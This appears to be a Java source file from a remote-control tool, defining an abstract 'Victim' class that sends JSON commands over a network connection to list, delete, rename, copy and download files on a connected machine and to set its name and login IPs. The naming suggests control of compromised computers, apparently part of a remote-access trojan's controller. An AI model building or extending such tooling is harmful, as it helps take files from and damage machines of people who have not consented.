import db.DBUsers;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.net.SocketAddress;
import java.util.ArrayList;

public abstract class Victim extends Client {

    protected DBUsers dbUsers;
    String name;
    ArrayList<String> owners;

    void sendGetFiles(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.files");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendDeleteFile(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    String getName() {
        return name;
    }

    ArrayList<String> getOwners() {
        return owners;
    }

    void sendMakeDir(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendRenameFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendGetFileInfo(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendCopyFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendSetVictimName(String newName, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("newName", newName);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendSetLoginIps(JSONArray ips, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("ips", ips);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendStartDownloadFile(String path, long port, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "start.download.file");
        query.put("path", path);
        query.put("port", port);
        query.put("owner", owner);
        sendMessage(query);
    }

    void sendMessage(JSONObject message) {
        SocketAddress address = context.channel().remoteAddress();
        System.out.println(name + " ("+ address + ") << " + message);
        context.writeAndFlush(message);
    }
}
